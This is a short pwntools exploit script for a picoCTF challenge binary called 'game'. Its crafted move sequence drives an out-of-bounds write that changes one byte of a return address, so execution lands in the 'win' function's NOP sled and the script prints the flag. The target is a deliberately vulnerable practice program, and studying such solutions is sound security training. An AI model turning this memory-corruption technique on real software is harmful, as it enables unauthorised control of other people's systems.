#!/usr/bin/env python3

from pwn import *

exe = ELF("./game")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 49254)

    return r


def main():
    r = conn()

    # 'p'       --> stay and solve the actual round (similar to skip turn);
    # 'l'       --> changes player char (the given next char will be used)
    # 'wasd'    --> move chars

    # call to move_player in main: 0x08049704
    # win: 0x0804975d;     But we can jump to the NOP sled in the 'win' function, which includes the address 0x08049774 (we can change just one byte!)

    payload =  b'aaaawwwww'         # Get out of bound without touching anything important
    payload += b'l`'                # Change player's tile to '`' (0x60)    (for some reasons jumping to 0x....5d won't work :/)
    payload += b'a' * 39 + b's'     # Get to the 'X'

    r.sendlineafter(b'\n', payload)
    r.recvuntil(b'picoCTF', drop=True)
    flag = r.recvuntilS('}', drop=False)
    log.warn(f'Flag obtained: picoCTF{flag}')


if __name__ == "__main__":
    main()
